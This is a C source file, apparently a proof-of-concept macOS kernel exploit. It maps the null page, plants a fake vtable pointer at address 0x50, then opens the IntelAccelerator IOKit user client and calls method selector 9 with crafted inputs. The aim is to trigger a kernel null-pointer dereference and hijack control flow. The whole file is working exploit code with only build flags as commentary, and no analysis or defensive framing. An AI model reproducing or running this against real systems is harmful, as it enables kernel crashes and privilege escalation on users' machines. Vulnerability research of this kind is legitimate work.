#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

// compile with
// clang exploit.c -o exploit -framework IOKit -m32 -Wl,-pagezero_size,0 -w

int main(int argc, char* argv[]){

  // allocation memory at null page
  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  vm_address_t addr = 0;
  vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  char* np = 0;
  for(int i =0; i<0x1000; i++)
  {
    np[i] = 'A';
  }

  char* vtable = (char*)malloc(0x1000);
  *((uint64_t*)(vtable+(0))) = vtable;
  *((uint64_t*)(vtable+(0x128))) = 0x0000000020160215;

  volatile uint64_t* null_pointer = 0x50; // 0x50
  *(null_pointer) = (uint64_t)vtable;

  uint64_t inputScalar[16] = {0,};
  char inputStruct[4096] = {0,};
  
  uint64_t inputScalarCnt = 0;
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  int selector = 0;
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0x4141; // we should do this...

  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0x4142; // we should do this.
  }

  io_service_t service = IOIteratorNext(iterator);
  
  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0x4143; // we also should do this.
  }
  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0x4144;
  }

  inputStructCnt = 12;
  inputScalarCnt = 2;
  outputScalarCnt = 0;
  outputStructCnt = 0;
  inputScalar[0] = 1522325085;
  inputScalar[1] = 597533237;


  err = IOConnectCallMethod(
   conn,
   9,
   inputScalar,
   inputScalarCnt,
   inputStruct,
   inputStructCnt,
   outputScalar,
   &outputScalarCnt,
   outputStruct,
   &outputStructCnt);     

  IOServiceClose(conn);
}
